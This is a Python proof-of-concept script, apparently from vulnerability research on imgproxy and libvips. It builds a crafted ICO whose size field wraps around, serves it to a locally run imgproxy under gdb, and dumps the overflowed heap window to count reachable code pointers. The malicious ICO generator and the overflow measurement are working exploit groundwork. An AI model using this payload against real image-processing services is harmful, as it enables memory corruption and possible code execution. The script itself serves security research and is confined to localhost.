#!/usr/bin/env python3
"""W13: measure the attacker-reachable heap window after the wrapped ICO write.

Serves a crafted ICO whose body is arbitrarily long (default 1024 x 0x41) on
127.0.0.1:18181, launches the pinned plain imgproxy under gdb bound to
127.0.0.1:18180, and at the wrapped-size vips_foreign_load_read_full call dumps
the memory window at the 3-byte allocation before and after the copy plus the
process mappings. GDB only prints: no inferior memory write, no forced call.

Post-processing classifies each 8-byte value in the post-write window as an
executable address (code pointer) or not. Both endpoints bind 127.0.0.1 only.

Usage: ico_codeptr_reach.py BINARY LIBDIR TAG [PRELOAD] [BODYLEN] [TIMEOUT]
"""
import http.client
import http.server
import os
import re
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

SRC_HOST, SRC_PORT = "127.0.0.1", 18181
PROXY_HOST, PROXY_PORT = "127.0.0.1", 18180
HERE = os.path.dirname(os.path.abspath(__file__))


def hostile_ico(bodylen):
    header = b"\x00\x00\x01\x00\x01\x00"
    # width,height,colors,reserved,planes,bitcount,data_size,offset
    entry = struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 32, 0xFFFFFFF5, 22)
    return header + entry + b"\x41" * bodylen


with open(os.path.join(HERE, "ico_benign.ico"), "rb") as _f:
    BENIGN_ICO = _f.read()

GDB_BODY = """set pagination off
set confirm off
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND {bind}
set environment IMGPROXY_BASE_URL http://{src}:{srcport}/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
python
import gdb
class W13BP(gdb.Breakpoint):
    def stop(self):
        try:
            return int(gdb.parse_and_eval("$rdx")) == 0xfffffff5
        except Exception:
            return False
W13BP("vips_foreign_load_read_full")
end
run
printf "W13_HIT base=%p actual=%p len=%p\\n", $rsi-14, $rsi, $rdx
set $w13buf = $rsi
python import gdb,os; print("W13_MAPS_BEGIN"); print(open("/proc/%d/maps" % gdb.selected_inferior().pid).read()); print("W13_MAPS_END")
printf "W13_PRE\\n"
x/{nwords}gx $w13buf-16
finish
printf "W13_POST\\n"
x/{nwords}gx $w13buf-16
printf "W13_BT\\n"
bt 3
printf "W13_CONTINUE\\n"
continue
printf "W13_END\\n"
quit
"""


class Source(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = BENIGN_ICO if self.path == "/benign.ico" else HOSTILE_ICO
        self.send_response(200)
        self.send_header("Content-Type", "image/x-icon")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def wait_port(host, port, seconds=20.0):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        try:
            with socket.create_connection((host, port), 0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def get(path, timeout):
    conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=timeout)
    try:
        conn.request("GET", "/insecure/" + path, headers={"Host": PROXY_HOST})
        resp = conn.getresponse()
        return resp.status, resp.read(120)
    finally:
        conn.close()


def classify(out, bodylen):
    """Report post-write qwords that land in an executable mapping."""
    exec_ranges = []
    in_map = False
    for line in out.splitlines():
        if line.startswith("W13_MAPS_BEGIN"):
            in_map = True
            continue
        if line.startswith("W13_MAPS_END"):
            in_map = False
            continue
        if in_map:
            m = re.match(r"\s*([0-9a-f]+)-([0-9a-f]+)\s+(\S{4})\s", line)
            if m and "x" in m.group(3):
                exec_ranges.append((int(m.group(1), 16), int(m.group(2), 16)))
    sections = out.split("W13_POST")
    post = sections[1].split("W13_BT")[0] if len(sections) > 1 else ""
    vals = [int(m, 16) for m in re.findall(r"0x([0-9a-f]{16})", post)]
    code = [(hex(v), v) for v in vals
            if any(lo <= v < hi for lo, hi in exec_ranges)]
    marker = sum(1 for v in vals if v == 0x4141414141414141)
    print(f"W13_CLASSIFY exec_ranges={len(exec_ranges)} qwords={len(vals)} "
          f"marker_qwords={marker} code_ptr_qwords={len(code)} "
          f"code_samples={[c[0] for c in code[:6]]}", flush=True)


def main():
    binary, libdir, tag = sys.argv[1:4]
    preload = int(sys.argv[4]) if len(sys.argv) > 4 else 2
    bodylen = int(sys.argv[5]) if len(sys.argv) > 5 else 1024
    timeout = float(sys.argv[6]) if len(sys.argv) > 6 else 10.0
    global HOSTILE_ICO
    HOSTILE_ICO = hostile_ico(bodylen)
    nwords = max(16, (bodylen // 8) + 8)

    fd, cmdpath = tempfile.mkstemp(prefix=f"w13-{tag}-", suffix=".cmd")
    with os.fdopen(fd, "w") as f:
        f.write(GDB_BODY.format(bind=f"{PROXY_HOST}:{PROXY_PORT}", src=SRC_HOST,
                                srcport=SRC_PORT, libdir=os.path.abspath(libdir),
                                nwords=nwords))
    logpath = os.path.join(HERE, f"http-ico-w13-{tag}.log")
    srv = http.server.ThreadingHTTPServer((SRC_HOST, SRC_PORT), Source)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    gdb = subprocess.Popen(["gdb", "-batch", "-x", cmdpath, binary],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                           text=True)
    results = []
    try:
        if not wait_port(PROXY_HOST, PROXY_PORT):
            print(f"W13 tag={tag} PROXY_LISTEN=FAIL", flush=True)
            return 2
        for i in range(preload):
            try:
                st, _ = get("rs:fill:16:16/plain/benign.ico", timeout)
                results.append(f"benign[{i}]={st}")
            except Exception as exc:
                results.append(f"benign[{i}]={type(exc).__name__}")
        try:
            st, body = get("rs:fill:16:16/plain/hostile.ico", timeout)
            results.append(f"hostile={st}:{body[:80]!r}")
        except Exception as exc:
            results.append(f"hostile={type(exc).__name__}:{exc}")
        print(f"W13 tag={tag} preload={preload} bodylen={bodylen} " +
              " ".join(results), flush=True)
    finally:
        try:
            out, _ = gdb.communicate(timeout=60)
        except subprocess.TimeoutExpired:
            gdb.kill()
            out, _ = gdb.communicate()
        with open(logpath, "w") as f:
            f.write(f"CLIENT tag={tag} preload={preload} bodylen={bodylen} " +
                    " ".join(results) + "\n=== GDB OUTPUT ===\n")
            f.write("\n".join(line.rstrip() for line in out.splitlines()) + "\n")
        for line in out.splitlines():
            if line.startswith(("W13_HIT", "W13_CLASSIFY", "W13_POST", "W13_END")):
                print("W13_LOG " + line[:300], flush=True)
            if "received signal" in line or "invalid" in line or "corrupt" in line:
                print("W13_FAULT " + line[:300], flush=True)
        classify(out, bodylen)
        srv.shutdown()
        srv.server_close()
        os.unlink(cmdpath)
    return 0


if __name__ == "__main__":
    sys.exit(main())
